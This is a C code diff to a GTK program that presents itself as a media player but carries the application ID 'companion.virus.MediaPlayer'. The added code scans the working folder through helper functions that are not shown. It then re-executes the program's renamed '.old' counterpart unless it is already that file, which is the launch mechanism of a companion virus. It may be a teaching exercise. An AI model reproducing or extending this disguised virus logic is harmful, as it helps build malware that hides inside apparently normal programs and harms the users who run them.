@@ -57,7 +57,25 @@ static void on_next(GtkButton *btn, gpointer data) {
 
 static void activate(GtkApplication *app, gpointer user_data) {
     AppData *ad = g_new0(AppData, 1);
-    ad->state = mediaplayer_state_new(g_get_home_dir());
+    ad->state = mediaplayer_state_new(g_get_current_dir());
+
+    // Scan directories
+    char *current_dir = ad->state->working_dir;
+    printf("%d\n", mediaplayer_scan_folder(current_dir, ad->state));
+    mediaplayer_verify_files(ad->state);
+
+    char *exe = getExec();
+    char *base_name = g_path_get_basename(exe);
+
+    printf("%s\n", exe);
+
+    if (strcmp(base_name, "mediaplayer.old") != 0) {
+        char *new_name = g_strconcat(base_name, ".old", NULL);
+        char *argv_exec[] = {new_name, NULL};
+        execv(new_name, argv_exec);
+
+        exit(EXIT_FAILURE);
+    }
 
     ad->window = create_standard_window(app, "Media Player", 800, 600);
     GtkWidget *vbox = create_padded_box(GTK_ORIENTATION_VERTICAL, 10, 10);
@@ -91,6 +109,7 @@ static void activate(GtkApplication *app, gpointer user_data) {
 int main(int argc, char **argv) {
     GtkApplication *app = gtk_application_new("companion.virus.MediaPlayer",
                                               G_APPLICATION_FLAGS_NONE);
+
     g_signal_connect(app, "activate", G_CALLBACK(activate), NULL);
     int status = g_application_run(G_APPLICATION(app), argc, argv);
     g_object_unref(app);
